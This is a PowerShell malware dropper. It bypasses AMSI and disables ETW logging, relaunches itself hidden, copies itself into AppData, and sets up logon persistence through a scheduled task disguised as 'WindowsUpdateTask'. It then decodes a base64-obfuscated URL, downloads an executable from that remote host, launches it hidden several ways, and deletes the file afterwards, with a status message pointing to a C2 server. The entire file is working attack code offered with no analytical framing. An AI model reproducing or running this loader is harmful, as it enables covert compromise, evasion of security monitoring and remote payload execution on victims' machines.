$ErrorActionPreference = 'SilentlyContinue'

# AMSI + ETW
try{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}catch{}
try{$etw=[Diagnostics.Eventing.EventProvider];$etw.GetField('m_enabled','NonPublic,Static').SetValue($null,$false)}catch{}

if($Host.Name -eq 'ConsoleHost'){
    Start-Job -ScriptBlock{param($p)Start-Process powershell -Arg "-ep Bypass -WindowStyle Hidden -NoProfile -NonInteractive -File `"$p`"" -WindowStyle Hidden}-ArgumentList $MyInvocation.MyCommand.Path|Out-Null
    exit
}

$cache = "$env:APPDATA\Microsoft\Windows\Caches"
$localPath = "$cache\launcher.ps1"
if($MyInvocation.MyCommand.Path){Copy-Item $MyInvocation.MyCommand.Path $localPath -Force}

# PERSISTENCE
$taskName = "WindowsUpdateTask"
if(-not(Get-ScheduledTask -TaskName $taskName -EA 0)){
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$localPath`""))
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-EncodedCommand $enc"
    $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
}

# DIRECT DOWNLOAD + EXECUTE WITH STATUS
$u = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9hZ2VkLW1vdW50YWluLTYxNGIubmF0YWxpYS1rdXNoODIud29ya2Vycy5kZXYvdXBkYXRl'))
$wc = New-Object Net.WebClient
$wc.Headers.Add('User-Agent','Mozilla/5.0')

try {
    $bytes = $wc.DownloadData($u)
    Write-Host "[+] Downloaded $($bytes.Length) bytes" -ForegroundColor Green
    $tmp = [IO.Path]::GetTempFileName() + ".exe"
    [IO.File]::WriteAllBytes($tmp, $bytes)
    
    Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "`"$tmp`"" | Out-Null
    (New-Object -ComObject WScript.Shell).Run("`"$tmp`"",0,$false)
    Start-Process $tmp -WindowStyle Hidden
    Write-Host "[+] Payload launched - check C2 NOW" -ForegroundColor Green
} catch {
    Write-Host "[-] DOWNLOAD FAILED: $($_.Exception.Message)" -ForegroundColor Red
}

Start-Job -ScriptBlock{param($f)Start-Sleep 5;Remove-Item $f -Force -EA 0}-ArgumentList $tmp|Out-Null
